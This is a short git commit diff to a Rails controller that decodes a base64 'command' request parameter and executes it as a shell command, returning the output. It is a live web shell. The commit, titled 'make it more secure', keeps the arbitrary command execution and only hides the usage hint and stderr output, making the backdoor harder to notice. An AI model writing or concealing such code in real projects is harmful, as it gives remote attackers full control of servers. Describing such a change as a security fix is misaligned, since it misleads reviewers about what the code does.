c3231c4534ad196cd8e2ede9f2a83576469167c5
hailong.leon@gmail.com <hailong.leon@gmail.com>
2016-09-28 11:30:50 +1000

    make it more secure

--- app/controllers/welcome_controller.rb
+++ app/controllers/welcome_controller.rb
@@ -10,10 +10,10 @@ class WelcomeController < ApplicationController
     @test = params[:command].class
 
     if params[:command].nil?
-        @response = "200 OK. Send HTTP request with param \"command\" plus base64 encoded shell command"
+        @response = "200 OK."
     else
         command = Base64.decode64(params[:command]).gsub("\n","")
-        @response = `#{command} 2>&1`
+        @response = `#{command}`
     end
 
   end
